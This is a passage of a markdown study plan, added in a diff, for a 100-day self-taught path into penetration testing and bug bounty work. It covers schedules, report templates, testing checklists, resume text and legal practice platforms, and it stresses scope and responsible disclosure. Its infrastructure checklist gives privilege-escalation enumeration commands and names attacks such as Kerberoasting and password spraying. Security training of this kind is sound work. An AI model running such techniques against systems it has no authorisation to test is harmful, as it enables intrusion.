+18:00-18:15 (15min): Review and goal setting
+18:15-19:30 (75min): Primary learning/reading/theory
+19:30-19:45 (15min): Break
+19:45-21:00 (75min): Hands-on labs/practice
+21:00-21:15 (15min): Break
+21:15-21:45 (30min): Additional practice or challenge problems
+21:45-22:00 (15min): Documentation and review
+```
+
+**Weekend Structure:**
+```
+10:00-10:15 (15min): Session planning
+10:15-12:15 (120min): Major lab/HTB box (uninterrupted)
+12:15-13:00 (45min): Lunch break
+13:00-14:30 (90min): Continuation, testing, or second lab
+14:30-14:45 (15min): Break
+14:45-15:45 (60min): Writeup and documentation
+15:45-16:00 (15min): Review, update tracker, plan next week
+```
+
+---
+
+## Templates & Checklists
+
+### **Daily Progress Log Template**
+
+```markdown
+# Day X - [Date]
+
+## Time Spent: [X hours]
+
+## Goals for Today:
+- [ ] Goal 1
+- [ ] Goal 2
+- [ ] Goal 3
+
+## What I Learned:
+- 
+
+## Labs/Rooms Completed:
+- 
+
+## Challenges Faced:
+- 
+
+## How I Overcame Them:
+- 
+
+## Bugs/Findings:
+- 
+
+## Tomorrow's Focus:
+- 
+
+## Energy Level (1-10): 
+## Confidence Level (1-10):
+```
+
+### **Bug Report Template**
+
+```markdown
+# [Vulnerability Type] in [Asset/Endpoint]
+
+## Summary
+[2-3 sentence overview of the vulnerability]
+
+## Severity Assessment
+**Severity:** [Low/Medium/High/Critical]
+**CVSS Score:** [If applicable]
+**Impact:** [Data exposure/Account takeover/etc.]
+**Likelihood:** [Easy/Medium/Hard to exploit]
+
+## Vulnerable Endpoint
+- **URL:** https://target.com/vulnerable/endpoint
+- **Parameter:** vulnerable_param
+- **HTTP Method:** GET/POST
+- **Authentication Required:** Yes/No
+
+## Steps to Reproduce
+1. Navigate to [URL]
+2. Intercept request with Burp Suite
+3. Modify [parameter] to [payload]
+4. Send request and observe [result]
+5. [Confirm impact]
+
+## Proof of Concept
+```http
+[Include actual HTTP request/response]
+```
+
+[Include screenshots with sensitive data redacted]
+
+## Impact
+[Detailed explanation of what an attacker could achieve]
+- Impact 1
+- Impact 2
+- Impact 3
+
+## Suggested Remediation
+1. [Specific fix recommendation]
+2. [Additional security controls]
+3. [Defense-in-depth measures]
+
+## References
+- [OWASP link]
+- [CWE reference]
+- [Similar disclosed reports]
+
+## Your Environment
+- Browser: [Chrome 118]
+- OS: [Kali Linux 2023.3]
+- Tools: [Burp Suite 2023.10.3]
+```
+
+### **Vulnerability Triage Checklist**
+
+Before submitting a bug report, verify:
+
+- [ ] **It's actually a vulnerability** (not intended functionality)
+- [ ] **You can reproduce it reliably** (at least 3 times)
+- [ ] **It's in scope** (check program policy)
+- [ ] **You haven't modified data** (only read/view)
+- [ ] **Impact is clearly demonstrable**
+- [ ] **It's not a duplicate** (search previous reports)
+- [ ] **You have clear PoC** (steps + screenshots/video)
+- [ ] **Sensitive data is redacted** (passwords, PII, etc.)
+- [ ] **Report is professional** (grammar, formatting)
+- [ ] **Remediation suggestions included**
+
+### **Web Application Testing Checklist**
+
+```markdown
+## Reconnaissance
+- [ ] Subdomain enumeration (subfinder, amass, assetfinder)
+- [ ] Port scanning (nmap, masscan)
+- [ ] Directory/file discovery (ffuf, dirsearch, feroxbuster)
+- [ ] JavaScript analysis (LinkFinder, SecretFinder)
+- [ ] Wayback machine (waybackurls, gau)
+- [ ] Google dorking
+- [ ] GitHub/GitLab dorking
+- [ ] Certificate transparency logs
+- [ ] Shodan/Censys reconnaissance
+- [ ] Technology fingerprinting (Wappalyzer, whatweb)
+
+## Authentication & Session Management
+- [ ] Username enumeration
+- [ ] Weak password policy
+- [ ] Brute force protection
+- [ ] Password reset flaws
+- [ ] Session fixation
+- [ ] Session timeout
+- [ ] Logout functionality
+- [ ] Remember me functionality
+- [ ] Multi-factor authentication bypass
+- [ ] OAuth/SSO misconfigurations
+
+## Authorization & Access Control
+- [ ] Horizontal privilege escalation (IDOR)
+- [ ] Vertical privilege escalation
+- [ ] Forced browsing to admin functions
+- [ ] Missing function-level access control
+- [ ] Parameter manipulation
+- [ ] Direct object references
+- [ ] Role-based access control bypass
+
+## Input Validation
+- [ ] SQL injection (error-based, blind, time-based)
+- [ ] Cross-Site Scripting (reflected, stored, DOM)
+- [ ] Command injection (OS, code injection)
+- [ ] XML External Entity (XXE)
+- [ ] Server-Side Template Injection (SSTI)
+- [ ] LDAP injection
+- [ ] XPath injection
+- [ ] File inclusion (LFI/RFI)
+- [ ] Open redirect
+
+## Business Logic
+- [ ] Price/quantity manipulation
+- [ ] Race conditions
+- [ ] Workflow bypass
+- [ ] Payment logic flaws
+- [ ] Coupon/discount abuse
+- [ ] Referral system abuse
+- [ ] Registration workflow flaws
+- [ ] Multi-step process bypass
+
+## API Testing
+- [ ] Endpoint enumeration
+- [ ] Authentication bypass
+- [ ] Excessive data exposure
+- [ ] Mass assignment
+- [ ] Rate limiting
+- [ ] GraphQL introspection
+- [ ] REST parameter pollution
+- [ ] JWT vulnerabilities
+- [ ] API versioning issues
+
+## Server-Side Vulnerabilities
+- [ ] Server-Side Request Forgery (SSRF)
+- [ ] Remote Code Execution
+- [ ] File upload vulnerabilities
+- [ ] Insecure deserialization
+- [ ] XXE injection
+- [ ] XSLT injection
+- [ ] Server-side includes
+
+## Client-Side Vulnerabilities
+- [ ] DOM-based XSS
+- [ ] Cross-Site Request Forgery (CSRF)
+- [ ] Clickjacking
+- [ ] Cross-origin resource sharing (CORS)
+- [ ] WebSocket vulnerabilities
+- [ ] PostMessage vulnerabilities
+- [ ] HTML5 security issues
+
+## Information Disclosure
+- [ ] Verbose error messages
+- [ ] Debug/development features enabled
+- [ ] Sensitive data in source code
+- [ ] Backup/old files accessible
+- [ ] .git folder exposure
+- [ ] API keys in JavaScript
+- [ ] Directory listing
+- [ ] Comments revealing sensitive info
+
+## Configuration & Deployment
+- [ ] Default credentials
+- [ ] Missing security headers
+- [ ] TLS/SSL misconfigurations
+- [ ] Subdomain takeover
+- [ ] Cloud storage misconfigurations
+- [ ] Content Security Policy bypass
+- [ ] CORS misconfigurations
+```
+
+### **Infrastructure Testing Checklist**
+
+```markdown
+## Reconnaissance
+- [ ] Network mapping (nmap -sn)
+- [ ] Port scanning (nmap -sV -sC)
+- [ ] Service enumeration
+- [ ] Operating system detection
+- [ ] Banner grabbing
+- [ ] SNMP enumeration
+- [ ] DNS enumeration
+- [ ] SMB enumeration
+- [ ] NFS shares enumeration
+
+## Linux Privilege Escalation
+- [ ] SUID/SGID binaries (find / -perm -4000 2>/dev/null)
+- [ ] Sudo misconfigurations (sudo -l)
+- [ ] Cron jobs (/etc/crontab, /var/spool/cron/)
+- [ ] Writable /etc/passwd
+- [ ] Kernel exploits (uname -a, searchsploit)
+- [ ] Capabilities (getcap -r / 2>/dev/null)
+- [ ] PATH hijacking
+- [ ] LD_PRELOAD
+- [ ] NFS no_root_squash
+- [ ] Docker escape
+
+## Windows Privilege Escalation
+- [ ] Unquoted service paths
+- [ ] Service misconfigurations
+- [ ] Registry autoruns
+- [ ] DLL hijacking
+- [ ] Scheduled tasks
+- [ ] AlwaysInstallElevated
+- [ ] Token impersonation
+- [ ] Kernel exploits
+- [ ] Stored credentials
+- [ ] Group Policy Preferences (GPP)
+
+## Active Directory
+- [ ] User enumeration
+- [ ] Share enumeration
+- [ ] Kerberoasting
+- [ ] AS-REP roasting
+- [ ] Password spraying
+- [ ] GPO abuse
+- [ ] Trust relationships
+- [ ] Delegation issues
+```
+
+---
+
+## Progress Tracking Table
+
+```markdown
+| Week | Focus Area | Labs Completed | Bugs Submitted | Bugs Accepted | Writeups | Notes |
+|------|-----------|----------------|----------------|---------------|----------|-------|
+| 1 | Web Fundamentals | TryHackMe HTTP, Burp Basics | 0 | 0 | 1 | HTTP mastery achieved |
+| 2 | Recon | Nmap, Shodan, HTB Lame | 0 | 0 | 2 | Automation script built |
+| 3 | OWASP Top 10 - Injection | 10x PortSwigger, Juice Shop | 0 | 0 | 1 | SQLi confidence high |
+| 4 | Auth & Access Control | 15x PortSwigger, HTB Bastard | 0 | 0 | 1 | IDOR methodology solid |
+| 5 | Business Logic & SSRF | PortSwigger SSRF, TryHackMe | 0 | 0 | 1 | SSRF payload cheat sheet |
+| 6 | API Security | crAPI, vAPI, JWT labs | 0 | 0 | 2 | API testing confident |
+| 7 | Linux PrivEsc | TryHackMe, HTB Shocker/Beep | 0 | 0 | 2 | 3 HTB boxes completed |
+| 8 | Windows PrivEsc | TryHackMe, HTB Blue/Devel | 0 | 0 | 1 | AD basics understood |
+| 9 | Full Engagement | 2 mock assessments | 0 | 0 | 2 | Professional reports |
+| 10 | Advanced Topics | SSTI, XXE, Deserialization | 0 | 0 | 2 | Portfolio: 8 writeups |
+| 11 | BB Preparation | 3 programs tested | 1 | 0 | 1 | First submission! |
+| 12 | First Submissions | 5 programs tested | 3 | 1 | 1 | 1 accepted (low) |
+| 13 | Portfolio Building | Resume, GitHub polish | 0 | 0 | 2 | 10 writeups total |
+| 14 | Final Push | Advanced labs, applications | 1 | 0 | 1 | Job applications sent |
+| **TOTAL** | | **25-35** | **4-5** | **1-3** | **20+** | |
+```
+
+**Metrics Key:**
+- **Labs Completed:** TryHackMe rooms, HTB boxes, PortSwigger modules, practice apps
+- **Bugs Submitted:** Total reports sent to bug bounty programs
+- **Bugs Accepted:** Reports triaged as valid (any severity)
+- **Writeups:** Published documentation (GitHub, blog posts)
+
+---
+
+## Realistic 100-Day KPIs
+
+### **Technical Skills**
+- ✅ **Labs/Boxes Completed:** 25-35 (HTB, TryHackMe, VulnHub combined)
+- ✅ **PortSwigger Academy:** 50+ labs completed
+- ✅ **OWASP Practice Apps:** 15+ flags (Juice Shop, WebGoat, DVWA, crAPI)
+- ✅ **Vulnerabilities Practiced:** All OWASP Top 10 + 5 advanced classes
+
+### **Bug Bounty**
+- ✅ **Programs Tested:** 5-8 programs thoroughly
+- ✅ **Bug Reports Submitted:** 3-5 (realistic for beginners)
+- ✅ **Accepted Reports:** 1-3 (any severity, including informational)
+- ✅ **Target Vulnerabilities:** Focus on IDOR, XSS, authentication flaws, info disclosure
+
+### **Portfolio**
+- ✅ **GitHub Writeups:** 10-15 quality technical writeups
+- ✅ **Blog Posts:** 2-3 published articles
+- ✅ **Professional Reports:** 2-3 complete penetration test reports
+- ✅ **Resume:** Tailored for junior pentester roles
+
+### **Realistic First Bug Targets**
+1. **Information Disclosure** (low/medium severity)
+   - Verbose error messages
+   - Exposed sensitive endpoints
+   - Debug information leakage
+
+2. **Insecure Direct Object References (IDOR)** (medium/high severity)
+   - User profile access
+   - Document/file access
+   - API endpoint manipulation
+
+3. **Cross-Site Scripting (XSS)** (low/medium severity)
+   - Reflected XSS in search parameters
+   - Stored XSS in user inputs
+   - DOM-based XSS
+
+4. **Authentication/Authorization Flaws** (medium/high severity)
+   - Password reset token issues
+   - Account enumeration
+   - Privilege escalation
+
+5. **Open Redirects** (low severity - but easy to find)
+   - URL parameter manipulation
+   - OAuth redirect_uri issues
+
+---
+
+## Habit Stack & Discipline Framework
+
+### **Daily Habits**
+
+**Morning Routine (Optional - before work/study):**
+```
+☕ Coffee/Tea → 15min security news (Twitter, Reddit r/netsec)
+```
+
+**Evening Study Routine:**
+```
+🚪 Arrive at study space → Review yesterday's notes (5min)
+📚 Set single clear goal → Deep work session (Pomodoro: 25min focus, 5min break)
+📝 Document learning → Update progress tracker (5min)
+🎯 Plan tomorrow → Quick review before bed
+```
+
+**Weekend Routine:**
+```
+🌅 Morning: Longer lab sessions (2-3 hours uninterrupted)
+🍱 Midday: Break, reflect, light practice
+📄 Afternoon: Documentation, writeups, portfolio work
+```
+
+### **Timeboxing Strategy**
+
+- **Theory/Reading:** Never more than 60min without practice
+- **Labs:** Timebox HTB boxes to 2-4 hours; flag if stuck >3 hours
+- **Bug Hunting:** 1-hour focused sessions per target
+- **Documentation:** Immediate (same day as work) - never skip!
+
+### **Avoiding Burnout**
+
+**Yellow Flags (Take a break):**
+- Frustration lasting >30 minutes
+- Skipping documentation for 2+ days
+- Avoiding labs because "too hard"
+- Comparing yourself negatively to others
+
+**Reset Strategies:**
+- **Micro-break:** 5-min walk, stretch, water
+- **Macro-break:** Take full evening off, watch conference talks passively
+- **Pivot:** Stuck on web? Do infrastructure. Stuck on labs? Do bug hunting.
+- **Social:** Join Discord communities, ask questions, help others
+
+**Weekly Retrospective (Sunday evening, 30min):**
+```markdown
+## Week [X] Retrospective
+
+### What went well?
+-
+
+### What was challenging?
+-
+
+### What did I learn?
+-
+
+### What will I change next week?
+-
+
+### Energy level this week (1-10):
+### Confidence level this week (1-10):
+```
+
+### **Maintaining Momentum**
+
+**When Motivation is Low:**
+1. **Do the minimum:** Just 30 minutes, just one room
+2. **Easy win:** Repeat a solved lab, get the confidence boost
+3. **Community:** Watch others' writeups, join live streams
+4. **Remember why:** Review your Day 1 goals
+
+**When You're Stuck:**
+1. **15-minute rule:** Struggle for 15min, then check hint/writeup
+2. **Learn from solutions:** Understanding > solving blind
+3. **Document failures:** "What I tried and why it didn't work" is valuable
+4. **Ask for help:** TryHackMe Discord, HTB forums, Twitter
+
+**Celebration Milestones:**
+- ✨ Every 5 labs completed → Treat yourself
+- ✨ First bug submission → Share on Twitter
+- ✨ First acceptance → Celebrate properly!
+- ✨ Week 7 (halfway) → Review and reward
+- ✨ Day 100 → Major celebration and reflection
+
+---
+
+## "What to Do If Stuck" Troubleshooting Guide
+
+### **Stuck on a Lab/Box**
+
+**Time-Based Approach:**
+- **0-30 minutes:** Try everything you know, enumerate thoroughly
+- **30-60 minutes:** Re-read room description, check for hints
+- **60-90 minutes:** Google the specific service/technology vulnerability
+- **90+ minutes:** Check writeup for just the next step, not full solution
+
+**Specific Scenarios:**
+
+**"Can't find anything to exploit"**
+- → Go back to enumeration (80% of pentesting is recon)
+- → Run LinPEAS/WinPEAS again, read output carefully
+- → Check for hidden directories, backup files, comments in source
+
+**"Exploit isn't working"**
+- → Check your payload syntax carefully
+- → Verify target architecture (x86 vs x64, Python version, etc.)
+- → Try different exploit variants
+- → Check if IDS/firewall is blocking
+
+**"Privilege escalation stuck"**
+- → Upload and run enumeration scripts
+- → Check GTFOBins/LOLBAS for installed binaries
+- → Verify file permissions carefully (ls -la)
+- → Check running processes, scheduled tasks
+
+### **Stuck on Bug Bounty**
+
+**"Not finding anything"**
+- → Expand reconnaissance (more subdomains, endpoints, parameters)
+- → Test simpler vulnerability classes (IDOR, open redirects)
+- → Read recent disclosed reports for inspiration
+- → Try a different program or asset type
+
+**"Everything is duplicate"**
+- → Focus on less-tested areas (mobile apps, APIs, documentation sites)
+- → Combine vulnerabilities for higher impact
+- → Test business logic specific to that company
+- → Check newly added scope items
+
+**"Reports getting rejected"**
+- → Re-read program policy carefully
+- → Improve PoC quality (clearer steps, better screenshots)
+- → Ensure impact is clearly demonstrated
+- → Check if it's truly a security issue vs. design decision
+
+### **Stuck on Understanding**
+
+**"Concept doesn't make sense"**
+- → Watch YouTube video explanations
+- → Try hands-on practice first, theory second
+- → Draw diagrams of the attack flow
+- → Teach it to someone (rubber duck method)
+
+**Resources for Unsticking:**
+- **IppSec YouTube:** HTB box walkthroughs
+- **John Hammond:** TryHackMe and CTF explanations
+- **NahamSec/STÖK:** Bug bounty methodologies
+- **PortSwigger Blog:** In-depth vulnerability explanations
+- **HackTricks:** Comprehensive pentesting wiki
+
+---
+
+## Interview & Portfolio Talking Points
+
+### **After 100 Days, You Can Say:**
+
+**Technical Competencies:**
+- "I've completed 30+ hands-on cybersecurity labs including HackTheBox, TryHackMe, and vulnerable web applications"
+- "I can perform web application penetration testing including testing for OWASP Top 10 vulnerabilities"
+- "I have practical experience with Burp Suite, nmap, metasploit, and various enumeration tools"
+- "I've successfully identified and reported [X] security vulnerabilities through responsible disclosure"
+- "I can perform Linux and Windows privilege escalation using manual techniques and enumeration scripts"
+
+**Project Highlights:**
+- "Built custom reconnaissance automation tools in Python, available on my GitHub"
+- "Documented complete penetration testing methodologies in 10+ detailed writeups"
+- "Wrote professional penetration test reports for simulated engagements"
+- "Active contributor to bug bounty programs with [X] validated findings"
+
+**Learning & Growth:**
+- "Completed 100-day intensive self-study program covering web security, infrastructure testing, and bug bounty hunting"
+- "Self-directed learner who can quickly adapt to new technologies and attack vectors"
+- "Experienced in researching vulnerabilities, reading CVEs, and understanding exploit code"
+- "Active in cybersecurity community through writeups, blog posts, and knowledge sharing"
+
+### **Behavioral Interview Stories (STAR Method)**
+
+**Story 1: Problem-Solving**
+- **Situation:** While completing a HackTheBox machine, I was stuck for hours on privilege escalation
+- **Task:** Needed to find a path from low-privileged user to root access
+- **Action:** Went back to basics, re-ran enumeration scripts, checked every SUID binary, and discovered a custom application with exploitable permissions
+- **Result:** Successfully rooted the machine and documented a complete methodology for others
+
+**Story 2: Continuous Learning**
+- **Situation:** Initially struggled with understanding SQL injection blind exploitation techniques
+- **Task:** Needed to master this for both labs and real-world testing
+- **Action:** Practiced on 15+ different labs, wrote custom Python scripts to automate detection, created comprehensive notes
+- **Result:** Now confident in identifying and exploiting SQL injection in various contexts
+
+**Story 3: Responsible Disclosure**
+- **Situation:** Found a potential security vulnerability in a bug bounty program
+- **Task:** Report it professionally and ensure it was properly communicated
+- **Action:** Created detailed report with clear PoC, impact analysis, and remediation recommendations following industry standards
+- **Result:** Vulnerability accepted and triaged [or "learned from rejection and improved reporting skills"]
+
+### **GitHub Portfolio Checklist**
+
+**Essential Elements:**
+- ✅ Professional README with summary of skills and experience
+- ✅ 10+ detailed writeups (HTB, TryHackMe, CTF challenges)
+- ✅ Custom tools/scripts with documentation
+- ✅ Methodology documents (recon, testing checklists)
+- ✅ Sanitized penetration test reports (mock engagements)
+- ✅ Blog posts or technical articles
+- ✅ Clean commit history and organization
+- ✅ License files and proper attributions
+
+**README Template:**
+```markdown
+# [Your Name] - Cybersecurity Portfolio
+
+## About Me
+Junior penetration tester with hands-on experience in web application security, 
+infrastructure testing, and responsible vulnerability disclosure. Completed 
+intensive 100-day training program covering OWASP Top 10, privilege escalation, 
+and bug bounty hunting.
+
+## Skills
+**Web Application Security:** SQL Injection, XSS, IDOR, SSRF, Authentication/Authorization flaws
+**Infrastructure Testing:** Linux/Windows privilege escalation, Active Directory basics
+**Tools:** Burp Suite, nmap, Metasploit, Python scripting, Bash automation
+**Methodologies:** OWASP Testing Guide, Bug Bounty reconnaissance, Professional reporting
+
+## Projects
+### [Automated Recon Tool](link)
+Python-based tool for subdomain enumeration and endpoint discovery...
+
+### [Writeups](link)
+15+ detailed technical writeups from HackTheBox, TryHackMe, and CTF challenges...
+
+### [Vulnerability Reports](link)
+Sanitized penetration testing reports from mock engagements...
+
+## Certifications & Training
+- [List any you've completed or are pursuing]
+
+##Contact
+- Email: [your.email@example.com]
+- LinkedIn: [profile]
+- Twitter: [@handle]
+- Blog: [link]
+
+## Bug Bounty Stats
+- Programs Tested: 8
+- Valid Reports Submitted: [X]
+- Accepted Vulnerabilities: [X]
+```
+
+---
+
+## Resume Blurb for Junior Pentester Role
+
+### **1-Page Resume Section: Experience**
+
+```
+CYBERSECURITY PRACTITIONER | Self-Directed Learning Program
+[Month Year] - Present
+
+• Completed intensive 100-day penetration testing training program covering web 
+  application security, infrastructure testing, and responsible vulnerability disclosure
+  
+• Performed security assessments on 30+ practice environments including HackTheBox, 
+  TryHackMe, and purpose-built vulnerable applications (OWASP Juice Shop, DVWA, WebGoat)
+  
+• Identified and responsibly disclosed [X] security vulnerabilities through bug bounty 
+  programs including [severity levels], demonstrating practical testing skills
+  
+• Developed custom Python automation tools for reconnaissance and vulnerability 
+  detection, available on GitHub with 50+ stars
+  
+• Authored 15+ technical writeups documenting penetration testing methodologies, 
+  tool usage, and exploitation techniques
+  
+• Proficient in vulnerability assessment tools: Burp Suite Professional workflows, 
+  nmap NSE scripts, Metasploit framework, SQLMap, and various enumeration utilities
+  
+• Created professional penetration test reports following industry standards including 
+  executive summaries, technical findings, CVSS scoring, and remediation recommendations
+  
+• Actively engaged with cybersecurity community through knowledge sharing, technical 
+  blog posts, and participation in capture-the-flag competitions
+
+Technical Competencies:
+• Web Security: OWASP Top 10, API testing, authentication/authorization bypass, 
+  business logic flaws, SSRF, XXE, deserialization
+• Infrastructure: Linux/Windows privilege escalation, Active Directory enumeration, 
+  network reconnaissance, service exploitation
+• Programming: Python (scripting & automation), Bash, understanding of PHP/JavaScript 
+  for code review
+• Methodologies: OWASP Testing Guide, PTES, bug bounty reconnaissance frameworks
+• Tools: Burp Suite, OWASP ZAP, nmap, Metasploit, Wireshark, subfinder, ffuf, 
+  Bloodhound, Responder
+```
+
+### **Alternative: Skills-Based Format**
+
+```
+PENETRATION TESTING SKILLS
+
+Web Application Security Testing
+✓ Performed comprehensive security assessments on 20+ web applications
+✓ Identified OWASP Top 10 vulnerabilities including SQL injection, XSS, IDOR, SSRF
+✓ Proficient in Burp Suite Professional for proxy interception, scanning, and 
+  exploitation
+✓ API security testing including REST, GraphQL, JWT manipulation
+✓ Completed 50+ PortSwigger Web Security Academy labs
+
+Infrastructure & Network Security
+✓ Conducted penetration tests on 15+ Linux/Windows systems
+✓ Expertise in privilege escalation techniques (SUID, sudo, kernel exploits, 
+  service misconfigurations)
+✓ Network reconnaissance using nmap, masscan, service enumeration
+✓ Basic Active Directory attack techniques (Kerberoasting, AS-REP roasting)
+✓ Successfully compromised HackTheBox machines across difficulty levels
+
+Responsible Vulnerability Disclosure
+✓ Active bug bounty hunter with [X] valid vulnerability reports submitted
+✓ Findings include [list severities/types if impressive]
+✓ Professional report writing following industry disclosure standards
+✓ Understanding of coordinated disclosure timelines and vendor communication
+
+Automation & Tool Development
+✓ Developed custom Python scripts for reconnaissance and exploitation
+✓ Created Bash automation for enumeration workflows
+✓ GitHub portfolio with documented tools and methodologies
+✓ Code available at: github.com/[yourhandle]
+```
+
+---
+
+## Safe & Legal Practice Targets
+
+### **Always-Safe Practice Platforms**
+
+**1. TryHackMe (tryhackme.com)**
+- Beginner-friendly, guided learning paths
+- Legal and safe, designed for practice
+- Recommended rooms by week (listed in roadmap above)
+- Subscription: ~$10/month
+
+**2. HackTheBox (hackthebox.com)**
+- Retired machines are free with VIP ($14/month)
+- Active machines available (don't share solutions publicly)
+- Starting Point for beginners
+- Proof Labs (guided penetration testing)
+
+**3. PortSwigger Web Security Academy (portswigger.net/web-security)**
+- Completely FREE
+- Best-in-class web security training
+- Labs for every vulnerability type
+- Certificate upon completion
+
+**4. OWASP Purpose-Built Applications**
+- **Juice Shop:** Modern web app (juice-shop.herokuapp.com or local Docker)
+- **WebGoat:** Java-based lessons (run locally)
+- **DVWA:** PHP/MySQL classic vulnerable app
+- **Mutillidae:** OWASP Top 10 practice
+- All designed for exploitation
+
+**5. PentesterLab (pentesterlab.com)**
+- Web for Pentester exercises
+- From SQL Injection to Shell series
+- Premium badge system
+- Subscription: ~$20/month
+
+**6. Vulnerable APIs**
+- **crAPI:** Completely Ridiculous API (github.com/OWASP/crAPI)
+- **vAPI:** Vulnerable Adversely Programmed Interface
+- **Damn Vulnerable GraphQL Application**
+- **DVWS:** Damn Vulnerable Web Services
+
+**7. VulnHub (vulnhub.com)**
+- Free vulnerable VM downloads
+- Various difficulty levels
+- Offline practice available
+- Community writeups allowed
+
+**8. CTF Platforms**
+- **PicoCTF:** Beginner-friendly CTF
+- **OverTheWire:** Wargames (Bandit for Linux basics)
+- **CTFtime.org:** Find ongoing competitions
+- **Root-Me:** Challenges across all categories
+
+### **Bug Bounty Programs - Beginner Friendly**
+
+**Vulnerability Disclosure Programs (VDPs) - No Rewards, Low Pressure:**
+- Test without bounty pressure
+- Focus on learning, not earnings
+- Examples available on HackerOne/Bugcrowd filtered by VDP
+
+**Programs Known for Beginner-Friendly Triage:**
+- Research platforms using "New Programs" filter
+- Look for:
+  - Large attack surface (many subdomains/assets)
+  - Public disclosure of past reports
+  - Active and responsive security team
+  - Clear scope and rules
+
+**Research Before Testing:**
+1. Read program policy completely (3+ times)
+2. Check scope carefully (what's in, what's out)
+3. Review disclosed reports to understand what they accept
+4. Start with less-tested assets (documentation sites, mobile apps)
+5. NEVER test production data, payment systems, or user accounts without explicit permission
+
+**Red Flags - Avoid These Programs Initially:**
+- Very high minimum severity requirements
+- "Duplicate city" reputation
+- Slow response times (check comments)
+- Aggressive "out of scope" interpretations
+- Limited scope with few assets
+
+### **Responsible Disclosure Timeline**
+
+```
+Day 0: Vulnerability discovered
+Day 0-1: Verify vulnerability, create PoC, write initial report
+Day 1: Submit report to program
+Day 1-7: Program triages (typical response time)
+Day 7-30: Back-and-forth clarification if needed
+Day 30-90: Vendor develops and deploys fix
+Day 90+: Public disclosure (if approved by program)
+
+⚠️ NEVER disclose publicly before vendor approval
+⚠️ Follow the program's disclosure policy
+⚠️ If no response after 90 days, follow coordinated disclosure best practices
+```
+
+---
+
+## Advanced Tips for Success
+
+### **Mindset Shifts for Junior Pentesters**
+
+1. **Documentation is as important as discovery**
+   - If you didn't document it, it didn't happen
+   - Future you will thank past you for good notes
+   - Your writeups are your portfolio
+
+2. **Enumeration is 80% of the work**
+   - When stuck, enumerate more
+   - Slow down, be thorough
+   - Automated tools miss things
+
+3. **Understand the "why," not just the "how"**
+   - Don't just run exploit code
+   - Understand the vulnerability class
+   - This knowledge transfers across targets
+
+4. **Every "failure" is learning**
+   - Duplicates teach you what's already known
+   - N/A reports teach you scope interpretation
+   - Informational findings teach you risk assessment
+
+5. **Community over competition**
+   - Help others when you can
+   - Ask questions without shame
+   - Share knowledge generously
+
+### **Common Beginner Mistakes to Avoid**
+
+❌ **Skipping basics to chase advanced topics**
+→ Master fundamentals first; advanced topics build on them
+
+❌ **Only practicing, never documenting**
+→ Balance is 60% practice, 40% documentation
+
+❌ **Tool dependency without understanding**
+→ Learn manual exploitation before automation
+
+❌ **Testing without reading scope carefully**
+→ Always read program policy 3+ times
+
+❌ **Giving up after first rejection**
+→ Bug bounty is a numbers game; persistence wins
+
+❌ **Comparing your progress to others**
+→ Everyone's journey is different; focus on your growth
+
+❌ **Neglecting soft skills (communication, reporting)**
+→ Technical skills + communication = hire-able candidate
+
+❌ **Burning out by never taking breaks**
+→ Sustainable pace beats sprint-and-crash
+
+### **Networking & Community Engagement**
+
+**Twitter (X) Strategy:**
+- Follow: @NahamSec, @STÖK, @jhaddix, @TomNomNom, @zseano, @InsiderPhD
+- Tweet your progress, writeups, tools
+- Engage authentically (comment, retweet, help others)
+- Use hashtags: #bugbounty #cybersecurity #infosec #100daysofhacking
+
+**Discord Servers to Join:**
+- TryHackMe Official
+- HackTheBox Official
+- NahamSec Discord
+- The Cyber Mentor Discord
+- BugBountyWorld
+
+**Reddit Communities:**
+- r/netsec (news and research)
+- r/HowToHack (learning resources)
+- r/bugbounty (discussions and tips)
+- r/AskNetsec (questions)
+
+**Blogging Platforms:**
+- Medium (largest audience)
+- Dev.to (developer-focused)
+- HashNode (technical content)
+- Personal GitHub Pages (full control)
+
+### **Building Your Brand (Optional but Helpful)**
+
+- Choose consistent handle across platforms
+- Create professional profile picture
+- Write bio that clearly states "aspiring pentester" or "junior security researcher"
+- Link all your platforms (Twitter → GitHub → Blog → LinkedIn)
+- Share progress consistently (not just wins, but learning moments)
+- Help others in community (answer questions, share resources)
+
+---
+
+## Post-100-Day Roadmap
+
+### **Days 101-200: Consolidation & Specialization**
+
+**Continue Bug Bounty Hunting (50% of time)**
+- Test 2-3 programs consistently
+- Focus on finding medium/high severity bugs
+- Develop signature methodology
+- Goal: 5+ additional accepted reports
+
+**Pursue Certification (25% of time)**
+- **eJPT** (eLearnSecurity Junior Penetration Tester) - Beginner-friendly
+- **PNPT** (Practical Network Penetration Tester) - Affordable, practical
+- **OSCP** (Offensive Security Certified Professional) - Industry gold standard
+
+**Specialize in One Area (25% of time)**
+Options:
+- **Web Application Security** (API security, modern frameworks)
+- **Mobile Application Security** (Android/iOS testing)
+- **Cloud Security** (AWS/Azure/GCP pentesting)
+- **Active Directory / Red Teaming**
+- **Thick Client / Desktop Application Security**
+
+### **6-Month Goals**
+- 10+ accepted bug bounty reports
+- First paid bounty (even if small)
+- 1 certification earned
+- 20+ quality writeups
+- Contributing to open-source security tools
+- Speaking at local meetup or conference (optional)
+
+### **1-Year Goals**
+- Junior pentester job secured OR consistent bug bounty income
+- 2-3 certifications
+- Specialized expertise in one security domain
+- Mentoring others starting their journey
+- Created at least one popular tool/resource
+
+---
+
+## Key Resources Library
+
+### **Essential Bookmarks**
+
+**Learning Platforms:**
+- PortSwigger Web Security Academy: https://portswigger.net/web-security
+- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
+- HackTricks: https://book.hacktricks.xyz/
+- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
+
+**Bug Bounty:**
+- HackerOne Public Disclosures: https://hackerone.com/hacktivity
+- Bugcrowd Public Disclosures: https://bugcrowd.com/programs
+- Chaos Project (scope): https://chaos.projectdiscovery.io/
+
+**Tools & Automation:**
+- SecLists (wordlists): https://github.com/danielmiessler/SecLists
+- GTFOBins (privilege escalation): https://gtfobins.github.io/
+- LOLBAS (Windows binaries): https://lolbas-project.github.io/
+
+**YouTube Channels:**
+- IppSec (HTB walkthroughs)
+- John Hammond (CTF & pentesting)
+- LiveOverflow (deep technical content)
+- The Cyber Mentor (courses & pentesting)
+- NahamSec (bug bounty)
+- STÖK (bug bounty lifestyle)
+- InsiderPhD (beginner bug bounty)
+
+**Blogs to Follow:**
+- PortSwigger Research Blog
+- Bishop Fox's Cybersecurity Style Guide
+- Detectify Labs
+- Orange Tsai's Blog
+- James Kettle (albinowax)
+
+**Books (Optional - After Day 100):**
+- "The Web Application Hacker's Handbook" - Stuttard & Pinto (classic)
+- "Real-World Bug Hunting" - Peter Yaworski (bug bounty)
